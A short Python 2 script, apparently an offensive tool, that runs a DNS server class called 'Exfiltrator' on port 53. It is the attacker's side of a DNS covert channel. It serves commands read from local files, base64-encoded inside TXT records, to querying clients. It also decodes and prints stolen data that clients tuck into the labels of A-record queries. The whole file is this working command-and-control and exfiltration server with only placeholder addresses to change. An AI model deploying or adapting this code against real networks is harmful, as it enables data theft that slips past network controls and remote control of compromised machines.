#!/usr/bin/python

import base64
from time import sleep
from dnslib import DNSRecord, RR, QTYPE, A, MX, TXT
from SocketServer import BaseRequestHandler, UDPServer

IP_ADDRESS='100.100.100.100'
DOMAIN_NAME='test.example.com'

class Exfiltrator(BaseRequestHandler, object):
    def __init__(self, *args):
        self.q_processors = {
            1: self._A,      # A record
            12: self._MX,    # PTR record
            15: self._MX,    # MX record
            28: self._AAAA,  # AAAA record
            16: self._TXT    # TXT record
            }
        super(Exfiltrator, self).__init__(*args)
    def _AAAA(self, name):
        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)

    def _TXT(self, name):
        print "_TXT."+name.label[0]+"."+name.label[1]

        try:
            if name.label[0] == "ini":
                with open("ini.txt") as f:
                        cmd = "@" + base64.standard_b64encode(f.readlines()[int(name.label[1])-1]) + "@"

            elif name.label[0] == "cmd":
                with open("cmd.txt") as f:
                        cmd = "@" + base64.standard_b64encode(f.readlines()[int(name.label[1])-1]) + "@"
        except:
            cmd = ''

        return RR(name, QTYPE.TXT, rdata=TXT(cmd), ttl=0)

    def _A(self, name):
        if name.label[0] == "data":
            print base64.b64decode(name.label[1]),
        else:
            print name

        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)

    def _MX(self, name):
        print name
        return RR(name, QTYPE.MX, rdata=MX(DOMAIN_NAME), ttl=0)

    def handle(self):
        request = DNSRecord.parse(self.request[0])
        socket = self.request[1]
        reply = request.reply()
        answer = self.q_processors[reply.q.qtype](reply.q.qname)
        reply.add_answer(answer)
        socket.sendto(reply.pack(), self.client_address)

if __name__ == '__main__':
    HOST, PORT = '0.0.0.0', 53
    server = UDPServer((HOST, PORT), Exfiltrator)
    server.serve_forever()
